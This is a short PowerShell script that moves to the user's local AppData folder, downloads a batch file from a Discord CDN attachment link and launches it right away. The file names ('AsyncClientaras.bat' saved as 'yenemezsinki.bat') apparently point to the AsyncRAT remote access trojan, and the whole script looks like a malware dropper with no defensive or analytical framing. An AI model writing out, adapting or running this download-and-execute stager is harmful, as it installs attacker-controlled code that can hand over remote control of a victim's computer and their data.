cd $env:LOCALAPPDATA

Invoke-WebRequest -URI https://cdn.discordapp.com/attachments/1020829026828435547/1020832897273446430/AsyncClientaras.bat -OutFile yenemezsinki.bat

cd $env:LOCALAPPDATA
start "$env:LOCALAPPDATA\yenemezsinki.bat"